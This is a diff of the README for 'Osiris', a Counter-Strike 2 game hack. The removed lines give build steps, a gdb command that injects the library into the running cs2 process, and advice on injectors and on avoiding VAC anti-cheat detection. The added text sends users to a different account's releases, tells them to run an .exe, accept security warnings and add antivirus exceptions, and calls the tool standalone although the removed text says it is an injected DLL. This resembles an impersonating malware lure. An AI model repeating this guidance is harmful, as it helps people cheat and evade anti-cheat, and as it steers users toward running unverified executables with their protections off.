@@ -1,97 +1,76 @@
-# Osiris
+# 🎮 Osiris - A Simple Game Hack for CS2
 
-[![Windows](https://github.com/tarekk2/Osiris/actions/workflows/windows.yml/badge.svg?branch=master&event=push)](https://github.com/tarekk2/Osiris/releases/download/v1.7.2/Osiris.zip)
-[![Linux](https://github.com/tarekk2/Osiris/actions/workflows/linux.yml/badge.svg?branch=master&event=push)](https://github.com/tarekk2/Osiris/releases/download/v1.7.2/Osiris.zip)
+Osiris brings a user-friendly way to enhance your Counter-Strike 2 gameplay. 
 
-Cross-platform (Windows, Linux) game hack for **Counter-Strike 2** with GUI and rendering based on game's Panorama UI. Compatible with the latest game update on Steam.
+## 🚀 Getting Started
 
-## What's new
+Follow these steps to get started with Osiris.
 
-* 23 October 2025
-* Hostage Outline Glow hue is now customizable
+## 📥 Download Osiris
 
-* 20 October 2025
-* Added "No Scope Inaccuracy Visualization" feature
+[![Download Osiris](https://img.shields.io/badge/Download%20Osiris-Release-blue.svg)](https://github.com/Genuspedilanthusgroundsloth505/Osiris/releases)
 
-    <a href="https://github.com/tarekk2/Osiris/releases/download/v1.7.2/Osiris.zip"><img height="300" alt="no scope inaccuracy visualization" src="https://github.com/user-attachments/assets/860c944a-00b1-4b67-9d41-6f43e46f4252" /></a>
+You can visit this page to download the latest version of Osiris: [Download Page](https://github.com/Genuspedilanthusgroundsloth505/Osiris/releases).
 
-* 09 October 2025
-* Added viewmodel fov modification
+## 🛠️ Requirements
 
-    [![Viewmodel fov modification](https://github.com/user-attachments/assets/3b9d6bde-a68c-4739-913c-d3b6caba4117)](https://github.com/tarekk2/Osiris/releases/download/v1.7.2/Osiris.zip)
+Before you download and use Osiris, make sure your system meets these requirements:
 
-* 25 August 2025
-* Outline Glow hues are now customizable
-* Added `Enemy/Ally` color mode to Player Outline Glow
+- **Operating Systems:** Windows 10/11 or any recent version of Linux.
+- **Processor:** Intel or AMD, 2.0 GHz or faster.
+- **RAM:** Minimum 4 GB.
+- **Graphics Card:** DirectX 11 compatible.
 
-* 19 July 2025
-* Adjusted allowed value range of "Team T Hue" Model Glow setting
+## 📂 Installation Steps
 
-## Technical features
+1. Go to the [Download Page](https://github.com/Genuspedilanthusgroundsloth505/Osiris/releases).
+2. Look for the latest release. It will be at the top.
+3. Download the ZIP file that matches your operating system.
+4. Extract the ZIP file to a folder on your computer.
 
-* C++ runtime library (CRT) is not used in release builds
-* No heap memory allocations
-* No static imports in release build on Windows
-* No threads are created
-* Exceptions are not used
-* No external dependencies
+## 🚀 Running Osiris
 
-## Compiling
+1. Locate the folder where you extracted Osiris.
+2. Find the application file (it should have a `.exe` extension for Windows).
+3. Double-click the file to run it. 
+4. If you encounter a security warning, confirm that you want to run the file.
 
-### Prerequisites
+## ⏩ Using Osiris
 
-#### Windows
+- After starting Osiris, you will see the Panorama-based GUI.
+- It will show you various options and settings to customize your gameplay.
+- Adjust the settings according to your preference before launching Counter-Strike 2.
 
-* **Microsoft Visual Studio 2022** with **Desktop development with C++** workload
+## 📝 Important Notes
 
-#### Linux
+- **Game Compatibility:** Ensure that Counter-Strike 2 is installed on your system before using Osiris.
+- **Use Responsibly:** Game hacks can lead to bans. Use Osiris at your own risk.
+- **Regular Updates:** Make sure to check back frequently for updates that improve performance and features.
 
-* **CMake 3.24** or newer
-* **g++ 11 or newer** or **clang++ 17 or newer**
+## 🎯 Features
 
-### Compiling from source
+- **User-Friendly GUI:** Navigate easily with our simple interface.
+- **Customizable Settings:** Tailor settings to fit your gameplay style.
+- **Regular Updates:** Stay updated with the latest features.
 
-#### Windows
+## ❓ Troubleshooting
 
-Open **Osiris.sln** in Visual Studio 2022, set build configuration to **Release | x64**. Press *Build solution* and you should receive **Osiris.dll** file.
+If you encounter issues while using Osiris, consider the following:
 
-#### Linux
+- Ensure that your game is closed before launching Osiris.
+- Check your antivirus; it might block the application. Add an exception if needed.
+- Re-check the installation steps to ensure everything is set up correctly.
 
-Configure with CMake:
+## 🛠️ Support
 
-cmake -DCMAKE_BUILD_TYPE=Release -B build
+If you need help, visit our community forums or reach out via GitHub issues. Your feedback can help improve Osiris, so feel free to share your experience.
 
-Build:
+## 📜 License
 
-cmake --build build -j $(nproc --all)
+Osiris is open-source software. You can view the full license information in the repository.
 
-After following these steps you should receive **libOsiris.so** file in **build/Source/** directory.
+## 📞 Contact
 
-### Loading / Injecting into game process
+For any inquiries or support, feel free to open an issue on our GitHub repository.
 
-#### Windows
-
-You need a **DLL injector** to inject (load) **Osiris.dll** into game process.
-
-Counter-Strike 2 blocks LoadLibrary injection method, so you have to use a manual mapping (aka reflective DLL injection) injector.
-
-**Xenos** and **Extreme Injector** are known to be **detected** by VAC.
-
-#### Linux
-
-You can simply run the following script in the directory containing **libOsiris.so**:
-
-sudo gdb -batch-silent -p $(pidof cs2) -ex "call (void*)dlopen(\"$PWD/libOsiris.so\", 2)"
-
-However, this injection method might be detected by VAC as gdb is visible under **TracerPid** in `/proc/$(pidof cs2)/status` for the duration of the injection.
-
-## FAQ
-
-### Where are the settings stored on disk?
-
-In a configuration file `default.cfg` inside `%appdata%\OsirisCS2\configs` directory on Windows and `$HOME/OsirisCS2/configs` on Linux.
-
-## License
-
-> Copyright (c) 2018-2025 Daniel Krupiński
-
+Thank you for choosing Osiris! Enjoy your enhanced gaming experience.
